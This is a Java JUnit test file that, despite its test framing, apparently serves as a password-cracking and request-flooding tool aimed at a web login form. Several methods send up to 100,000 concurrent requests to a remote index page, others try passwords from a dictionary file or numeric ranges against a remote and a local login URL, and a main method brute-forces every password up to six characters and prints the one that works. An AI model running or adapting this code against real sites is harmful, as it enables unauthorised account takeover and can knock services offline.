package com.http.httptest;

import java.io.*;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

/**
 * @author ：clt
 * @Date ：Created in 21:52 2019/10/7
 */

public class Test {


    @org.junit.Test
    public void remoteIndexRequestOnce() {
        long start = System.currentTimeMillis();
        String url = constant.REMOTE_INDEX_URL;
        String str = HttpRequestMethod.sendGet(url);
        System.out.println(str);
        System.out.println(System.currentTimeMillis() - start);
    }

    @org.junit.Test
    public void remoteIndexRequestTimes() {
        CountDownLatch latch = new CountDownLatch(1);
        ExecutorService pool = Executors.newFixedThreadPool(1000);
        for (int i = 0; i <= 1000; i++) {
            pool.execute(() -> {
                for (int j = 0; j < 100; j++) {
                    String str = HttpRequestMethod.sendGet(constant.REMOTE_INDEX_URL);
                }
            });
        }
        try {
            latch.await();
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
        pool.shutdown();
    }

    @org.junit.Test
    public void remoteLoginRequestOnce() {
        long start = System.currentTimeMillis();
        String url = constant.REMOTE_LOGIN_URL;
        String str = HttpRequestMethod.sendPost(url, "user=1213&pass=123123&submit=%b5%e3%bb%f7%b5%c7%c2%bc");
        if (str.charAt(65) == '登') {
            System.out.println("密码正确登录成功");
        } else {
            System.out.println(str.substring(65, 70));
        }
        System.out.println(System.currentTimeMillis() - start);
    }

    @org.junit.Test
    public void remoteLoginRequestTimes() {
        long start = System.currentTimeMillis();
        CountDownLatch latch = new CountDownLatch(10000);
        ExecutorService pool = Executors.newFixedThreadPool(1000);
        for (int i = 000000; i <= 1000000; i += 100) {
            pool.execute(new RemoteLoginRequestThread(i, latch));
        }
        try {
            latch.await();
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
        System.out.println("总用时" + (System.currentTimeMillis() - start));
        pool.shutdown();
    }

    @org.junit.Test
    public void localLoginRequestOnce() {
        long start = System.currentTimeMillis();
        String url = constant.LOCAL_LOGIN_URL;
        String str = HttpRequestMethod.sendPost(url, "user=1213&pass=123123&submit=%b5%e3%bb%f7%b5%c7%c2%bc");
        if (str.charAt(9) == '2') {
            System.out.println(str);
            System.out.println("密码正确登录成功");
        }
        System.out.println(System.currentTimeMillis() - start);
    }

    @org.junit.Test
    public void localLoginRequestTimesByDictionary() {
        File file = new File(constant.DICTIONARIES_PATH);
        BufferedReader br = null;
        try {
            br = new BufferedReader(new FileReader(file));
            String temp = br.readLine();
            while (temp != null) {
                System.out.println(temp);
                String str = HttpRequestMethod.sendPost(constant.REMOTE_LOGIN_URL,
                        "user=1213&pass="+temp+"&submit=%b5%e3%bb%f7%b5%c7%c2%bc");
                if (str.charAt(9) == '2') {
                    System.out.println(str);
                    System.out.println("登录成功,密码为"+temp);
                    break;
                }
                temp = br.readLine();
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    @org.junit.Test
    public void localLoginRequestTimes() {
        long start = System.currentTimeMillis();
        CountDownLatch latch = new CountDownLatch(10000);
        ExecutorService pool = Executors.newFixedThreadPool(1000);
        for (int i = 000000; i <= 1000000; i += 100) {
            pool.execute(new LocalLoginRequestThread(i, latch));
        }
        try {
            latch.await();
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
        System.out.println("总用时" + (System.currentTimeMillis() - start));
        pool.shutdown();
    }


    //密码可能会包含的字符集合
    static char[] charSource = {
//            'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm',
//            'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z',
//            'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M',
//            'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z',
            '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '.', '!', '@',};
    static int strLength = charSource.length; //字符集长度，65个字符即可抽象成65进制系统的基本数

    public static void main(String[] args) {

        int maxLength = 6; //设置可能最长的密码长度
        int counter = 0;
        StringBuilder buider = new StringBuilder();
        while (buider.toString().length() <= maxLength) {
            buider = new StringBuilder(maxLength * 2);
            int _counter = counter;
            while (_counter >= strLength) {//10进制转换成65进制
                buider.insert(0, charSource[_counter % strLength]);//获得低位
                _counter = _counter / strLength;
                _counter--;
            }
            buider.insert(0, charSource[_counter]);//最高位
            counter++;
            String str = HttpRequestMethod.sendPost(constant.LOCAL_LOGIN_URL, "user=" + constant.USER_NAME + "&pass=" + buider + "&submit=%b5%e3%bb%f7%b5%c7%c2%bc");
            System.out.println(str);
            if (str.charAt(9) == '2') {
                System.out.println(str);
                System.out.println("密码正确登录成功,密码为:" + buider);
                break;
            }
        }
    }

    @org.junit.Test
    public void test3() {
        String str = "<div style='text-align:center; margin-top:20px;'><font color=red>登录成功";
        System.out.println(str.indexOf('登'));
        for (int i = 0; i < 1000; i++) {
            System.out.println(String.format("%04d", i));
        }
    }

    @org.junit.Test
    public void test5() throws IOException {
        File file = new File("C:/Users/Mrchen/Desktop/PasswordData.txt");
        OutputStream os = new FileOutputStream(file);
        String password = "1";
        os.write(password.getBytes());
        os.close();
    }

}
